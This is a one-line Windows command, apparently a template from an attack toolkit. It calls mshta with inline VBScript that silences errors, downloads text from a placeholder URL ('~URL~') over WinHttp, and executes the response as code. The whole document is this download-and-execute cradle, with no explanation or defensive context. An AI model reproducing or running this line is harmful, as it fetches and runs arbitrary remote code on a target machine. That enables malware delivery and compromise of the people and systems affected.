mshta vbscript:Execute("on error resume next:Set x=CreateObject(""WinHttp.WinHttpRequest.5.1""):x.open""GET"",""~URL~"",false:x.send:Execute x.responseText")(window.close)
